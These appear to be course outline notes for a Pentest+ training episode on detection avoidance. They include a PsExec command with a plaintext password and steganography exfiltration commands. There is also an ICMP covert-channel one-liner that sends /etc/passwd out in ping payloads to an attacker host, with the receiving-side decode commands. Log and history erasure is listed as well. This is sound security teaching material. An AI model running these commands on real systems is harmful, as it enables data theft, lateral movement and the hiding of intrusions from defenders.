    detection-avoidance.md
    Show Name: Pentest+ (PT0-002)
    Topic Name: Attacks and Exploits
    Episode Name: Detection Avoidance

================================================================================
Detection Avoidance
Objectives:

    List and describe tools and techniques used for avoiding detection during a penetration test

    Living-off-the-Land
-        Fileless Malware
-            update_script.cmd
        PsExec
-            psexec \\192.168.241.200 -u administrator -p Eagle001Claw cmd.exe
-        WMI
-        PS Remoting
-        WinRM

    Data Exfiltration

        Steganography

-            stegsnow (ASCII text files)
-                stegsnow -C -p password -m "secret message" infile.txt outfile.txt

-            steghide (image files)
-                steghide embed -ef exfil.txt -cf hacker.jpg -sf hacker2.jpg

        Covert Channels
-            DNS
-            ICMP
-                TARGET: stringZ=cat /etc/passwd | od -tx1 | cut -c8- | tr -d " " | tr -d "\n"; counter=0; while (($counter <= ${#stringZ})); do ping -s 16 -c 1 -p ${stringZ:$counter:16} 10.10.10.1 && counter=$((counter+16));done`
                KALI:
-                    tcpdump -ntvvSxs 0 'icmp[0]=8' > data.dmp
-                    grep 0x0020 data.dmp | cut -c21- | tr -d " " | tr -d "\n" | xxd -r -p

    Covering Your Tracks
        shred
        /var/log
        .bash_history
        Event Viewer
